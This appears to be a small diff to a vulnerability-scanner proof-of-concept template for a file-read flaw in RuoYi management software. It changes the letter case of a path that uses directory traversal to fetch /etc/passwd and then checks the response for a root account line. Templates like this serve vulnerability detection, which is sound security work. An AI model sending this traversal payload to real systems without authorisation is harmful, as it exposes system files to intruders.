@@ -2,7 +2,7 @@ name: poc-yaml-ruoyi-management-fileread
 groups:
   linux:
     - method: GET
-      path: /Common/download/resource?resource=/profile/../../../../etc/passwd
+      path: /common/download/resource?resource=/profile/../../../../etc/passwd
       expression: |
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
   windows:
